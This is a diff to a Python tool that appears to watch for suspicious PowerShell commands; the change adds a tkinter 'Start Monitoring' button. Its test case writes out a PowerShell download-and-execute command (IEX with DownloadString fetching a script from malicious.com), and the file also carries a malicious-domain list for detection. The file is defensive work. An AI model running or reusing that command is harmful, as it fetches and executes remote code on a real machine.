@@ -1,4 +1,6 @@
 import psutil
+import subprocess
+import tkinter as tk
 
 # Define a list of known malicious domains
 malicious_domains = ["malicious.com", "example.com"]
@@ -62,8 +64,6 @@ def monitor_powershell():
                 print(f"Suspicious PowerShell Command Detected: {cmdline}")
 
 
-
-
 # Define a test case with a suspicious PowerShell command
 test_cmdline = "powershell.exe -command 'Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/malware.ps1')\"'"
 # test_cmdline = "test"
@@ -74,7 +74,20 @@ if is_suspicious(test_cmdline):
 else:
     print("Test: No Suspicious PowerShell Command Detected")
 
+def start_monitoring_code():
+    # Use subprocess to run the anti_virus.py script
+    subprocess.Popen(["python", "anti_virus.py"])
 
+# Create a tkinter window
+root = tk.Tk()
+root.title("CLI Monitor")
+
+# button to monitor code
+start_monitoring_button = tk.Button(root, text="Start Monitoring", command=start_monitoring_code)
+start_monitoring_button.pack()
+
+# main tkinter event loop
+root.mainloop()
 
 # Example usage:
 monitor_powershell()
